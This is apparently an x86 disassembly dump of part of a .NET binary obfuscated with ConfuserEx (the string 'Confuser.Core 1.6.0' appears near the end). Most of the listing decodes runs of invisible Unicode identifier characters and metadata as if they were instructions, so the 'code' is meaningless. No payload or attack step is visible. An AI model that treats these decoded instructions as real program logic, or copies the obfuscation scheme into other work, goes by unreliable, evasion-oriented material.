  40b309:	aa e2 81 
  40b30c:	ab                   	stos   %eax,%es:(%edi)
  40b30d:	e2 80                	loop   0x40b28f
  40b30f:	8e e2                	mov    %edx,%fs
  40b311:	80 8c e2 81 ae e2 80 	orb    $0xad,-0x7f1d517f(%edx,%eiz,8)
  40b318:	ad 
  40b319:	e2 80                	loop   0x40b29b
  40b31b:	ad                   	lods   %ds:(%esi),%eax
  40b31c:	e2 81                	loop   0x40b29f
  40b31e:	ae                   	scas   %es:(%edi),%al
  40b31f:	e2 80                	loop   0x40b2a1
  40b321:	aa                   	stos   %al,%es:(%edi)
  40b322:	e2 80                	loop   0x40b2a4
  40b324:	ae                   	scas   %es:(%edi),%al
  40b325:	e2 80                	loop   0x40b2a7
  40b327:	ab                   	stos   %eax,%es:(%edi)
  40b328:	e2 81                	loop   0x40b2ab
  40b32a:	aa                   	stos   %al,%es:(%edi)
  40b32b:	e2 81                	loop   0x40b2ae
  40b32d:	af                   	scas   %es:(%edi),%eax
  40b32e:	e2 80                	loop   0x40b2b0
  40b330:	ae                   	scas   %es:(%edi),%al
  40b331:	00 e2                	add    %ah,%dl
  40b333:	80 8c e2 81 ad e2 80 	orb    $0x8b,-0x7f1d527f(%edx,%eiz,8)
  40b33a:	8b 
  40b33b:	e2 80                	loop   0x40b2bd
  40b33d:	8b e2                	mov    %edx,%esp
  40b33f:	80 8e e2 81 af e2 80 	orb    $0x80,-0x1d507e1e(%esi)
  40b346:	ac                   	lods   %ds:(%esi),%al
  40b347:	e2 81                	loop   0x40b2ca
  40b349:	af                   	scas   %es:(%edi),%eax
  40b34a:	e2 81                	loop   0x40b2cd
  40b34c:	ad                   	lods   %ds:(%esi),%eax
  40b34d:	e2 81                	loop   0x40b2d0
  40b34f:	af                   	scas   %es:(%edi),%eax
  40b350:	e2 81                	loop   0x40b2d3
  40b352:	ae                   	scas   %es:(%edi),%al
  40b353:	e2 80                	loop   0x40b2d5
  40b355:	8d                   	lea    (bad),%esp
  40b356:	e2 81                	loop   0x40b2d9
  40b358:	ad                   	lods   %ds:(%esi),%eax
  40b359:	e2 80                	loop   0x40b2db
  40b35b:	8e e2                	mov    %edx,%fs
  40b35d:	80 8c e2 81 af e2 80 	orb    $0x8d,-0x7f1d507f(%edx,%eiz,8)
  40b364:	8d 
  40b365:	e2 80                	loop   0x40b2e7
  40b367:	8c e2                	mov    %fs,%edx
  40b369:	80 ad e2 80 ac e2 80 	subb   $0x80,-0x1d537f1e(%ebp)
  40b370:	8e e2                	mov    %edx,%fs
  40b372:	81 ac e2 80 ab e2 80 	subl   $0xaf81e2aa,-0x7f1d5480(%edx,%eiz,8)
  40b379:	aa e2 81 af 
  40b37d:	e2 81                	loop   0x40b300
  40b37f:	aa                   	stos   %al,%es:(%edi)
  40b380:	e2 80                	loop   0x40b302
  40b382:	ac                   	lods   %ds:(%esi),%al
  40b383:	e2 81                	loop   0x40b306
  40b385:	ad                   	lods   %ds:(%esi),%eax
  40b386:	e2 80                	loop   0x40b308
  40b388:	ae                   	scas   %es:(%edi),%al
  40b389:	e2 80                	loop   0x40b30b
  40b38b:	ab                   	stos   %eax,%es:(%edi)
  40b38c:	e2 81                	loop   0x40b30f
  40b38e:	aa                   	stos   %al,%es:(%edi)
  40b38f:	e2 80                	loop   0x40b311
  40b391:	ac                   	lods   %ds:(%esi),%al
  40b392:	e2 80                	loop   0x40b314
  40b394:	8f                   	(bad)
  40b395:	e2 81                	loop   0x40b318
  40b397:	ad                   	lods   %ds:(%esi),%eax
  40b398:	e2 80                	loop   0x40b31a
  40b39a:	8c e2                	mov    %fs,%edx
  40b39c:	80 8c e2 81 af e2 80 	orb    $0x8d,-0x7f1d507f(%edx,%eiz,8)
  40b3a3:	8d 
  40b3a4:	e2 80                	loop   0x40b326
  40b3a6:	ab                   	stos   %eax,%es:(%edi)
  40b3a7:	e2 81                	loop   0x40b32a
  40b3a9:	af                   	scas   %es:(%edi),%eax
  40b3aa:	e2 80                	loop   0x40b32c
  40b3ac:	ae                   	scas   %es:(%edi),%al
  40b3ad:	00 e2                	add    %ah,%dl
  40b3af:	80 8e e2 80 ae e2 80 	orb    $0x80,-0x1d517f1e(%esi)
  40b3b6:	ab                   	stos   %eax,%es:(%edi)
  40b3b7:	e2 81                	loop   0x40b33a
  40b3b9:	ac                   	lods   %ds:(%esi),%al
  40b3ba:	e2 80                	loop   0x40b33c
  40b3bc:	ad                   	lods   %ds:(%esi),%eax
  40b3bd:	e2 80                	loop   0x40b33f
  40b3bf:	8b e2                	mov    %edx,%esp
  40b3c1:	80 8d e2 80 ab e2 80 	orb    $0x80,-0x1d547f1e(%ebp)
  40b3c8:	ac                   	lods   %ds:(%esi),%al
  40b3c9:	e2 80                	loop   0x40b34b
  40b3cb:	8e e2                	mov    %edx,%fs
  40b3cd:	81 ae e2 81 af e2 80 	subl   $0x80e2aa80,-0x1d507e1e(%esi)
  40b3d4:	aa e2 80 
  40b3d7:	8b e2                	mov    %edx,%esp
  40b3d9:	80 8c e2 80 ae e2 80 	orb    $0x8e,-0x7f1d5180(%edx,%eiz,8)
  40b3e0:	8e 
  40b3e1:	e2 80                	loop   0x40b363
  40b3e3:	ae                   	scas   %es:(%edi),%al
  40b3e4:	e2 80                	loop   0x40b366
  40b3e6:	8e e2                	mov    %edx,%fs
  40b3e8:	81 aa e2 80 aa e2 81 	subl   $0x80e2aa81,-0x1d557f1e(%edx)
  40b3ef:	aa e2 80 
  40b3f2:	8d                   	lea    (bad),%esp
  40b3f3:	e2 81                	loop   0x40b376
  40b3f5:	af                   	scas   %es:(%edi),%eax
  40b3f6:	e2 80                	loop   0x40b378
  40b3f8:	ae                   	scas   %es:(%edi),%al
  40b3f9:	e2 80                	loop   0x40b37b
  40b3fb:	8f                   	(bad)
  40b3fc:	e2 80                	loop   0x40b37e
  40b3fe:	ab                   	stos   %eax,%es:(%edi)
  40b3ff:	e2 80                	loop   0x40b381
  40b401:	ab                   	stos   %eax,%es:(%edi)
  40b402:	e2 80                	loop   0x40b384
  40b404:	8b e2                	mov    %edx,%esp
  40b406:	81 ac e2 81 ab e2 80 	subl   $0x8b80e28f,-0x7f1d547f(%edx,%eiz,8)
  40b40d:	8f e2 80 8b 
  40b411:	e2 80                	loop   0x40b393
  40b413:	ac                   	lods   %ds:(%esi),%al
  40b414:	e2 80                	loop   0x40b396
  40b416:	8e e2                	mov    %edx,%fs
  40b418:	80 ad e2 80 ab e2 80 	subb   $0x80,-0x1d547f1e(%ebp)
  40b41f:	8e e2                	mov    %edx,%fs
  40b421:	81 ab e2 81 af e2 80 	subl   $0xe200ae80,-0x1d507e1e(%ebx)
  40b428:	ae 00 e2 
  40b42b:	80 aa e2 81 aa e2 80 	subb   $0x80,-0x1d557e1e(%edx)
  40b432:	8f                   	(bad)
  40b433:	e2 80                	loop   0x40b3b5
  40b435:	ae                   	scas   %es:(%edi),%al
  40b436:	e2 80                	loop   0x40b3b8
  40b438:	8c e2                	mov    %fs,%edx
  40b43a:	80 8c e2 80 8e e2 80 	orb    $0xaa,-0x7f1d7180(%edx,%eiz,8)
  40b441:	aa 
  40b442:	e2 81                	loop   0x40b3c5
  40b444:	ab                   	stos   %eax,%es:(%edi)
  40b445:	e2 80                	loop   0x40b3c7
  40b447:	ae                   	scas   %es:(%edi),%al
  40b448:	e2 80                	loop   0x40b3ca
  40b44a:	8b e2                	mov    %edx,%esp
  40b44c:	80 ac e2 80 8b e2 80 	subb   $0xab,-0x7f1d7480(%edx,%eiz,8)
  40b453:	ab 
  40b454:	e2 81                	loop   0x40b3d7
  40b456:	af                   	scas   %es:(%edi),%eax
  40b457:	e2 80                	loop   0x40b3d9
  40b459:	8b e2                	mov    %edx,%esp
  40b45b:	80 8b e2 80 ac e2 80 	orb    $0x80,-0x1d537f1e(%ebx)
  40b462:	ae                   	scas   %es:(%edi),%al
  40b463:	e2 81                	loop   0x40b3e6
  40b465:	af                   	scas   %es:(%edi),%eax
  40b466:	e2 81                	loop   0x40b3e9
  40b468:	aa                   	stos   %al,%es:(%edi)
  40b469:	e2 80                	loop   0x40b3eb
  40b46b:	ae                   	scas   %es:(%edi),%al
  40b46c:	e2 81                	loop   0x40b3ef
  40b46e:	ad                   	lods   %ds:(%esi),%eax
  40b46f:	e2 81                	loop   0x40b3f2
  40b471:	ad                   	lods   %ds:(%esi),%eax
  40b472:	e2 80                	loop   0x40b3f4
  40b474:	ac                   	lods   %ds:(%esi),%al
  40b475:	e2 80                	loop   0x40b3f7
  40b477:	8f                   	(bad)
  40b478:	e2 80                	loop   0x40b3fa
  40b47a:	ab                   	stos   %eax,%es:(%edi)
  40b47b:	e2 81                	loop   0x40b3fe
  40b47d:	ab                   	stos   %eax,%es:(%edi)
  40b47e:	e2 81                	loop   0x40b401
  40b480:	aa                   	stos   %al,%es:(%edi)
  40b481:	e2 80                	loop   0x40b403
  40b483:	8e e2                	mov    %edx,%fs
  40b485:	80 ad e2 81 af e2 80 	subb   $0x80,-0x1d507e1e(%ebp)
  40b48c:	ad                   	lods   %ds:(%esi),%eax
  40b48d:	e2 80                	loop   0x40b40f
  40b48f:	8b e2                	mov    %edx,%esp
  40b491:	80 8d e2 80 8b e2 80 	orb    $0x80,-0x1d747f1e(%ebp)
  40b498:	ae                   	scas   %es:(%edi),%al
  40b499:	e2 80                	loop   0x40b41b
  40b49b:	ab                   	stos   %eax,%es:(%edi)
  40b49c:	e2 81                	loop   0x40b41f
  40b49e:	ab                   	stos   %eax,%es:(%edi)
  40b49f:	e2 81                	loop   0x40b422
  40b4a1:	af                   	scas   %es:(%edi),%eax
  40b4a2:	e2 80                	loop   0x40b424
  40b4a4:	ae                   	scas   %es:(%edi),%al
  40b4a5:	00 e2                	add    %ah,%dl
  40b4a7:	81 ad e2 80 8c e2 81 	subl   $0x80e2ae81,-0x1d737f1e(%ebp)
  40b4ae:	ae e2 80 
  40b4b1:	8f                   	(bad)
  40b4b2:	e2 80                	loop   0x40b434
  40b4b4:	8f                   	(bad)
  40b4b5:	e2 80                	loop   0x40b437
  40b4b7:	8b e2                	mov    %edx,%esp
  40b4b9:	80 8e e2 80 8f e2 80 	orb    $0x80,-0x1d707f1e(%esi)
  40b4c0:	ae                   	scas   %es:(%edi),%al
  40b4c1:	e2 81                	loop   0x40b444
  40b4c3:	af                   	scas   %es:(%edi),%eax
  40b4c4:	e2 80                	loop   0x40b446
  40b4c6:	8e e2                	mov    %edx,%fs
  40b4c8:	80 8e e2 80 ab e2 80 	orb    $0x80,-0x1d547f1e(%esi)
  40b4cf:	ae                   	scas   %es:(%edi),%al
  40b4d0:	e2 81                	loop   0x40b453
  40b4d2:	ac                   	lods   %ds:(%esi),%al
  40b4d3:	e2 80                	loop   0x40b455
  40b4d5:	ae                   	scas   %es:(%edi),%al
  40b4d6:	e2 80                	loop   0x40b458
  40b4d8:	ab                   	stos   %eax,%es:(%edi)
  40b4d9:	e2 81                	loop   0x40b45c
  40b4db:	aa                   	stos   %al,%es:(%edi)
  40b4dc:	e2 81                	loop   0x40b45f
  40b4de:	ae                   	scas   %es:(%edi),%al
  40b4df:	e2 80                	loop   0x40b461
  40b4e1:	8e e2                	mov    %edx,%fs
  40b4e3:	80 ab e2 80 8f e2 80 	subb   $0x80,-0x1d707f1e(%ebx)
  40b4ea:	ab                   	stos   %eax,%es:(%edi)
  40b4eb:	e2 80                	loop   0x40b46d
  40b4ed:	8c e2                	mov    %fs,%edx
  40b4ef:	81 ac e2 81 af e2 80 	subl   $0x8c80e28b,-0x7f1d507f(%edx,%eiz,8)
  40b4f6:	8b e2 80 8c 
  40b4fa:	e2 81                	loop   0x40b47d
  40b4fc:	ae                   	scas   %es:(%edi),%al
  40b4fd:	e2 81                	loop   0x40b480
  40b4ff:	ac                   	lods   %ds:(%esi),%al
  40b500:	e2 81                	loop   0x40b483
  40b502:	ac                   	lods   %ds:(%esi),%al
  40b503:	e2 81                	loop   0x40b486
  40b505:	af                   	scas   %es:(%edi),%eax
  40b506:	e2 80                	loop   0x40b488
  40b508:	8b e2                	mov    %edx,%esp
  40b50a:	81 aa e2 81 ab e2 80 	subl   $0x80e28e80,-0x1d547e1e(%edx)
  40b511:	8e e2 80 
  40b514:	8b e2                	mov    %edx,%esp
  40b516:	80 8c e2 80 ac e2 81 	orb    $0xaf,-0x7e1d5380(%edx,%eiz,8)
  40b51d:	af 
  40b51e:	e2 80                	loop   0x40b4a0
  40b520:	ae                   	scas   %es:(%edi),%al
  40b521:	00 e2                	add    %ah,%dl
  40b523:	80 ac e2 81 ae e2 80 	subb   $0x8d,-0x7f1d517f(%edx,%eiz,8)
  40b52a:	8d 
  40b52b:	e2 80                	loop   0x40b4ad
  40b52d:	8f                   	(bad)
  40b52e:	e2 80                	loop   0x40b4b0
  40b530:	8d                   	lea    (bad),%esp
  40b531:	e2 80                	loop   0x40b4b3
  40b533:	8b e2                	mov    %edx,%esp
  40b535:	80 ad e2 80 aa e2 80 	subb   $0x80,-0x1d557f1e(%ebp)
  40b53c:	ad                   	lods   %ds:(%esi),%eax
  40b53d:	e2 80                	loop   0x40b4bf
  40b53f:	aa                   	stos   %al,%es:(%edi)
  40b540:	e2 81                	loop   0x40b4c3
  40b542:	ad                   	lods   %ds:(%esi),%eax
  40b543:	e2 80                	loop   0x40b4c5
  40b545:	8f                   	(bad)
  40b546:	e2 80                	loop   0x40b4c8
  40b548:	aa                   	stos   %al,%es:(%edi)
  40b549:	e2 80                	loop   0x40b4cb
  40b54b:	ac                   	lods   %ds:(%esi),%al
  40b54c:	e2 80                	loop   0x40b4ce
  40b54e:	8c e2                	mov    %fs,%edx
  40b550:	81 aa e2 80 ad e2 80 	subl   $0x80e28b80,-0x1d527f1e(%edx)
  40b557:	8b e2 80 
  40b55a:	ab                   	stos   %eax,%es:(%edi)
  40b55b:	e2 80                	loop   0x40b4dd
  40b55d:	8e e2                	mov    %edx,%fs
  40b55f:	80 ae e2 81 ad e2 81 	subb   $0x81,-0x1d527e1e(%esi)
  40b566:	ae                   	scas   %es:(%edi),%al
  40b567:	e2 80                	loop   0x40b4e9
  40b569:	8b e2                	mov    %edx,%esp
  40b56b:	80 aa e2 81 ae e2 80 	subb   $0x80,-0x1d517e1e(%edx)
  40b572:	8b e2                	mov    %edx,%esp
  40b574:	80 8e e2 80 8b e2 81 	orb    $0x81,-0x1d747f1e(%esi)
  40b57b:	ac                   	lods   %ds:(%esi),%al
  40b57c:	e2 81                	loop   0x40b4ff
  40b57e:	ae                   	scas   %es:(%edi),%al
  40b57f:	e2 80                	loop   0x40b501
  40b581:	ab                   	stos   %eax,%es:(%edi)
  40b582:	e2 80                	loop   0x40b504
  40b584:	ab                   	stos   %eax,%es:(%edi)
  40b585:	e2 80                	loop   0x40b507
  40b587:	8f                   	(bad)
  40b588:	e2 80                	loop   0x40b50a
  40b58a:	ac                   	lods   %ds:(%esi),%al
  40b58b:	e2 81                	loop   0x40b50e
  40b58d:	ad                   	lods   %ds:(%esi),%eax
  40b58e:	e2 80                	loop   0x40b510
  40b590:	8b e2                	mov    %edx,%esp
  40b592:	80 8b e2 80 ad e2 81 	orb    $0x81,-0x1d527f1e(%ebx)
  40b599:	af                   	scas   %es:(%edi),%eax
  40b59a:	e2 80                	loop   0x40b51c
  40b59c:	ae                   	scas   %es:(%edi),%al
  40b59d:	00 e2                	add    %ah,%dl
  40b59f:	80 8b e2 80 8b e2 80 	orb    $0x80,-0x1d747f1e(%ebx)
  40b5a6:	8b e2                	mov    %edx,%esp
  40b5a8:	80 ab e2 81 ac e2 81 	subb   $0x81,-0x1d537e1e(%ebx)
  40b5af:	ae                   	scas   %es:(%edi),%al
  40b5b0:	e2 81                	loop   0x40b533
  40b5b2:	ab                   	stos   %eax,%es:(%edi)
  40b5b3:	e2 80                	loop   0x40b535
  40b5b5:	8d                   	lea    (bad),%esp
  40b5b6:	e2 80                	loop   0x40b538
  40b5b8:	ac                   	lods   %ds:(%esi),%al
  40b5b9:	e2 80                	loop   0x40b53b
  40b5bb:	8c e2                	mov    %fs,%edx
  40b5bd:	80 8b e2 81 ac e2 81 	orb    $0x81,-0x1d537e1e(%ebx)
  40b5c4:	ac                   	lods   %ds:(%esi),%al
  40b5c5:	e2 80                	loop   0x40b547
  40b5c7:	ac                   	lods   %ds:(%esi),%al
  40b5c8:	e2 80                	loop   0x40b54a
  40b5ca:	aa                   	stos   %al,%es:(%edi)
  40b5cb:	e2 81                	loop   0x40b54e
  40b5cd:	af                   	scas   %es:(%edi),%eax
  40b5ce:	e2 80                	loop   0x40b550
  40b5d0:	8f                   	(bad)
  40b5d1:	e2 81                	loop   0x40b554
  40b5d3:	ae                   	scas   %es:(%edi),%al
  40b5d4:	e2 81                	loop   0x40b557
  40b5d6:	af                   	scas   %es:(%edi),%eax
  40b5d7:	e2 81                	loop   0x40b55a
  40b5d9:	af                   	scas   %es:(%edi),%eax
  40b5da:	e2 80                	loop   0x40b55c
  40b5dc:	aa                   	stos   %al,%es:(%edi)
  40b5dd:	e2 80                	loop   0x40b55f
  40b5df:	aa                   	stos   %al,%es:(%edi)
  40b5e0:	e2 81                	loop   0x40b563
  40b5e2:	ac                   	lods   %ds:(%esi),%al
  40b5e3:	e2 81                	loop   0x40b566
  40b5e5:	ad                   	lods   %ds:(%esi),%eax
  40b5e6:	e2 80                	loop   0x40b568
  40b5e8:	aa                   	stos   %al,%es:(%edi)
  40b5e9:	e2 81                	loop   0x40b56c
  40b5eb:	af                   	scas   %es:(%edi),%eax
  40b5ec:	e2 80                	loop   0x40b56e
  40b5ee:	ae                   	scas   %es:(%edi),%al
  40b5ef:	e2 80                	loop   0x40b571
  40b5f1:	8e e2                	mov    %edx,%fs
  40b5f3:	80 ac e2 80 ad e2 80 	subb   $0xac,-0x7f1d5280(%edx,%eiz,8)
  40b5fa:	ac 
  40b5fb:	e2 80                	loop   0x40b57d
  40b5fd:	8c e2                	mov    %fs,%edx
  40b5ff:	81 ac e2 80 8d e2 81 	subl   $0xac81e2aa,-0x7e1d7280(%edx,%eiz,8)
  40b606:	aa e2 81 ac 
  40b60a:	e2 81                	loop   0x40b58d
  40b60c:	ad                   	lods   %ds:(%esi),%eax
  40b60d:	e2 80                	loop   0x40b58f
  40b60f:	8b e2                	mov    %edx,%esp
  40b611:	81 ae e2 81 af e2 80 	subl   $0xe200ae80,-0x1d507e1e(%esi)
  40b618:	ae 00 e2 
  40b61b:	80 ae e2 80 ad e2 81 	subb   $0x81,-0x1d527f1e(%esi)
  40b622:	ab                   	stos   %eax,%es:(%edi)
  40b623:	e2 81                	loop   0x40b5a6
  40b625:	ac                   	lods   %ds:(%esi),%al
  40b626:	e2 80                	loop   0x40b5a8
  40b628:	8e e2                	mov    %edx,%fs
  40b62a:	80 8d e2 81 af e2 80 	orb    $0x80,-0x1d507e1e(%ebp)
  40b631:	ae                   	scas   %es:(%edi),%al
  40b632:	e2 81                	loop   0x40b5b5
  40b634:	aa                   	stos   %al,%es:(%edi)
  40b635:	e2 81                	loop   0x40b5b8
  40b637:	ae                   	scas   %es:(%edi),%al
  40b638:	e2 80                	loop   0x40b5ba
  40b63a:	ae                   	scas   %es:(%edi),%al
  40b63b:	e2 80                	loop   0x40b5bd
  40b63d:	8e e2                	mov    %edx,%fs
  40b63f:	80 ab e2 81 af e2 80 	subb   $0x80,-0x1d507e1e(%ebx)
  40b646:	ad                   	lods   %ds:(%esi),%eax
  40b647:	e2 80                	loop   0x40b5c9
  40b649:	ad                   	lods   %ds:(%esi),%eax
  40b64a:	e2 80                	loop   0x40b5cc
  40b64c:	8e e2                	mov    %edx,%fs
  40b64e:	81 ae e2 80 8f e2 81 	subl   $0x81e2aa81,-0x1d707f1e(%esi)
  40b655:	aa e2 81 
  40b658:	af                   	scas   %es:(%edi),%eax
  40b659:	e2 80                	loop   0x40b5db
  40b65b:	8c e2                	mov    %fs,%edx
  40b65d:	81 ab e2 80 ae e2 80 	subl   $0x81e28c80,-0x1d517f1e(%ebx)
  40b664:	8c e2 81 
  40b667:	ac                   	lods   %ds:(%esi),%al
  40b668:	e2 80                	loop   0x40b5ea
  40b66a:	8c e2                	mov    %fs,%edx
  40b66c:	81 ae e2 81 af e2 81 	subl   $0x80e2ae81,-0x1d507e1e(%esi)
  40b673:	ae e2 80 
  40b676:	8b e2                	mov    %edx,%esp
  40b678:	80 8e e2 81 ae e2 81 	orb    $0x81,-0x1d517e1e(%esi)
  40b67f:	af                   	scas   %es:(%edi),%eax
  40b680:	e2 80                	loop   0x40b602
  40b682:	8b e2                	mov    %edx,%esp
  40b684:	80 ab e2 81 af e2 81 	subb   $0x81,-0x1d507e1e(%ebx)
  40b68b:	aa                   	stos   %al,%es:(%edi)
  40b68c:	e2 81                	loop   0x40b60f
  40b68e:	af                   	scas   %es:(%edi),%eax
  40b68f:	e2 81                	loop   0x40b612
  40b691:	af                   	scas   %es:(%edi),%eax
  40b692:	e2 80                	loop   0x40b614
  40b694:	ae                   	scas   %es:(%edi),%al
  40b695:	00 00                	add    %al,(%eax)
  40b697:	00 da                	add    %bl,%dl
  40b699:	82 e0 9f             	and    $0x9f,%al
  40b69c:	23 0f                	and    (%edi),%ecx
  40b69e:	f9                   	stc
  40b69f:	45                   	inc    %ebp
  40b6a0:	ae                   	scas   %es:(%edi),%al
  40b6a1:	9f                   	lahf
  40b6a2:	7e 94                	jle    0x40b638
  40b6a4:	dc fb                	fdivr  %st,%st(3)
  40b6a6:	49                   	dec    %ecx
  40b6a7:	03 00                	add    (%eax),%eax
  40b6a9:	08 b7 7a 5c 56 19    	or     %dh,0x19565c7a(%edi)
  40b6af:	34 e0                	xor    $0xe0,%al
  40b6b1:	89 03                	mov    %eax,(%ebx)
  40b6b3:	20 00                	and    %al,(%eax)
  40b6b5:	01 04 01             	add    %eax,(%ecx,%eax,1)
  40b6b8:	00 00                	add    %al,(%eax)
  40b6ba:	00 23                	add    %ah,(%ebx)
  40b6bc:	01 00                	add    %eax,(%eax)
  40b6be:	1e                   	push   %ds
  40b6bf:	43                   	inc    %ebx
  40b6c0:	6f                   	outsl  %ds:(%esi),(%dx)
  40b6c1:	6e                   	outsb  %ds:(%esi),(%dx)
  40b6c2:	66 75 73             	data16 jne 0x40b738
  40b6c5:	65 72 2e             	gs jb  0x40b6f6
  40b6c8:	43                   	inc    %ebx
  40b6c9:	6f                   	outsl  %ds:(%esi),(%dx)
  40b6ca:	72 65                	jb     0x40b731
  40b6cc:	20 31                	and    %dh,(%ecx)
  40b6ce:	2e 36 2e 30 2b       	cs ss xor %ch,%cs:(%ebx)
  40b6d3:	34 34                	xor    $0x34,%al
  40b6d5:	37                   	aaa
  40b6d6:	33 34 31             	xor    (%ecx,%esi,1),%esi
  40b6d9:	39 36                	cmp    %esi,(%esi)
  40b6db:	34 66                	xor    $0x66,%al
  40b6dd:	00 00                	add    %al,(%eax)
  40b6df:	03 06                	add    (%esi),%eax
  40b6e1:	1d 05 03 06 11       	sbb    $0x11060305,%eax
  40b6e6:	2c 03                	sub    $0x3,%al
  40b6e8:	00 00                	add    %al,(%eax)
  40b6ea:	01 06                	add    %eax,(%esi)
  40b6ec:	00 01                	add    %al,(%ecx)
  40b6ee:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40b6f3:	10 01                	adc    %al,(%ecx)
  40b6f5:	01 1e                	add    %ebx,(%esi)
  40b6f7:	00 08                	add    %cl,(%eax)
  40b6f9:	08 00                	or     %al,(%eax)
  40b6fb:	04 02                	add    $0x2,%al
  40b6fd:	18 09                	sbb    %cl,(%ecx)
  40b6ff:	09 10                	or     %edx,(%eax)
  40b701:	09 02                	or     %eax,(%edx)
  40b703:	06                   	push   %es
  40b704:	09 05 20 01 09 12    	or     %eax,0x12090120
  40b70a:	10 04 06             	adc    %al,(%esi,%eax,1)
  40b70d:	1d 11 08 02 06       	sbb    $0x6020811,%eax
  40b712:	08 04 20             	or     %al,(%eax,%eiz,1)
  40b715:	01 01                	add    %eax,(%ecx)
  40b717:	08 0a                	or     %cl,(%edx)
  40b719:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40b71c:	1d 11 08 09 12       	sbb    $0x12090811,%eax
  40b721:	10 08                	adc    %cl,(%eax)
  40b723:	03 06                	add    (%esi),%eax
  40b725:	12 11                	adc    (%ecx),%dl
  40b727:	05 20 01 01 12       	add    $0x12010120,%eax
  40b72c:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  40b72f:	01 09                	add    %ecx,(%ecx)
  40b731:	08 03                	or     %al,(%ebx)
  40b733:	06                   	push   %es
  40b734:	12 18                	adc    (%eax),%bl
  40b736:	03 06                	add    (%esi),%eax
  40b738:	12 1c 03             	adc    (%ebx,%eax,1),%bl
  40b73b:	06                   	push   %es
  40b73c:	12 24 04             	adc    (%esp,%eax,1),%ah
  40b73f:	06                   	push   %es
  40b740:	1d 11 0c 03 06       	sbb    $0x6030c11,%eax
  40b745:	12 10                	adc    (%eax),%dl
  40b747:	02 06                	add    (%esi),%al
  40b749:	02 03                	add    (%ebx),%al
  40b74b:	06                   	push   %es
  40b74c:	11 0c 04             	adc    %ecx,(%esp,%eax,1)
  40b74f:	20 01                	and    %al,(%ecx)
  40b751:	01 09                	add    %ecx,(%ecx)
  40b753:	05 20 02 01 08       	add    $0x8010220,%eax
  40b758:	08 07                	or     %al,(%edi)
  40b75a:	20 02                	and    %al,(%edx)
  40b75c:	01 12                	add    %edx,(%edx)
  40b75e:	11 12                	adc    %edx,(%edx)
  40b760:	11 09                	adc    %ecx,(%ecx)
  40b762:	20 04 01             	and    %al,(%ecx,%eax,1)
  40b765:	12 11                	adc    (%ecx),%dl
  40b767:	12 11                	adc    (%ecx),%dl
  40b769:	0a 0a                	or     (%edx),%cl
  40b76b:	05 20 01 01 1d       	add    $0x1d010120,%eax
  40b770:	05 04 00 01 09       	add    $0x9010004,%eax
  40b775:	09 03                	or     %eax,(%ebx)
  40b777:	06                   	push   %es
  40b778:	11 08                	adc    %ecx,(%eax)
  40b77a:	06                   	push   %es
  40b77b:	20 02                	and    %al,(%edx)
  40b77d:	09 12                	or     %edx,(%edx)
  40b77f:	10 09                	adc    %cl,(%ecx)
  40b781:	04 06                	add    $0x6,%al
  40b783:	1d 11 20 05 20       	sbb    $0x20052011,%eax
  40b788:	02 09                	add    (%ecx),%cl
  40b78a:	09 05 07 20 03 05    	or     %eax,0x5032007
  40b790:	12 10                	adc    (%eax),%dl
  40b792:	09 05 08 20 04 05    	or     %eax,0x5042008
  40b798:	12 10                	adc    (%eax),%dl
  40b79a:	09 05 05 05 20 01    	or     %eax,0x1200505
  40b7a0:	05 12 10 06 20       	add    $0x20061012,%eax
  40b7a5:	02 05 12 10 05 06    	add    0x6051012,%al
  40b7ab:	20 02                	and    %al,(%edx)
  40b7ad:	01 12                	add    %edx,(%edx)
  40b7af:	11 02                	adc    %eax,(%edx)
  40b7b1:	05 20 02 01 09       	add    $0x9010220,%eax
  40b7b6:	09 04 20             	or     %eax,(%eax,%eiz,1)
  40b7b9:	01 01                	add    %eax,(%ecx)
  40b7bb:	05 04 20 01 05       	add    $0x5012004,%eax
  40b7c0:	09 03                	or     %eax,(%ebx)
  40b7c2:	20 00                	and    %al,(%eax)
  40b7c4:	02 05 00 01 08 1d    	add    0x1d080100,%al
  40b7ca:	0e                   	push   %cs
  40b7cb:	06                   	push   %es
  40b7cc:	00 03                	add    %al,(%ebx)
  40b7ce:	01 0e                	add    %ecx,(%esi)
  40b7d0:	0e                   	push   %cs
  40b7d1:	0e                   	push   %cs
  40b7d2:	03 00                	add    (%eax),%eax
  40b7d4:	00 0e                	add    %cl,(%esi)
  40b7d6:	06                   	push   %es
  40b7d7:	00 03                	add    %al,(%ebx)
  40b7d9:	0e                   	push   %cs
  40b7da:	0e                   	push   %cs
  40b7db:	0e                   	push   %cs
  40b7dc:	0e                   	push   %cs
  40b7dd:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40b7e2:	0e                   	push   %cs
  40b7e3:	04 00                	add    $0x0,%al
  40b7e5:	01 02                	add    %eax,(%edx)
  40b7e7:	0e                   	push   %cs
  40b7e8:	05 00 01 12 15       	add    $0x15120100,%eax
  40b7ed:	0e                   	push   %cs
  40b7ee:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40b7f3:	0e                   	push   %cs
  40b7f4:	04 00                	add    $0x0,%al
  40b7f6:	00 12                	add    %dl,(%edx)
  40b7f8:	19 06                	sbb    %eax,(%esi)
  40b7fa:	00 02                	add    %al,(%edx)
  40b7fc:	01 12                	add    %edx,(%edx)
  40b7fe:	19 0e                	sbb    %ecx,(%esi)
  40b800:	06                   	push   %es
  40b801:	00 02                	add    %al,(%edx)
  40b803:	01 12                	add    %edx,(%edx)
  40b805:	19 02                	sbb    %eax,(%edx)
  40b807:	07                   	pop    %es
  40b808:	00 02                	add    %al,(%edx)
  40b80a:	01 12                	add    %edx,(%edx)
  40b80c:	19 11                	sbb    %edx,(%ecx)
  40b80e:	1d 06 00 01 12       	sbb    $0x12010006,%eax
  40b813:	21 12                	and    %edx,(%edx)
  40b815:	19 05 00 01 01 12    	sbb    %eax,0x12010100
  40b81b:	21 04 20             	and    %eax,(%eax,%eiz,1)
  40b81e:	01 01                	add    %eax,(%ecx)
  40b820:	0e                   	push   %cs
  40b821:	08 01                	or     %al,(%ecx)
  40b823:	00 08                	add    %cl,(%eax)
  40b825:	00 00                	add    %al,(%eax)
  40b827:	00 00                	add    %al,(%eax)
  40b829:	00 1e                	add    %bl,(%esi)
  40b82b:	01 00                	add    %eax,(%eax)
  40b82d:	01 00                	add    %eax,(%eax)
  40b82f:	54                   	push   %esp
  40b830:	02 16                	add    (%esi),%dl
  40b832:	57                   	push   %edi
  40b833:	72 61                	jb     0x40b896
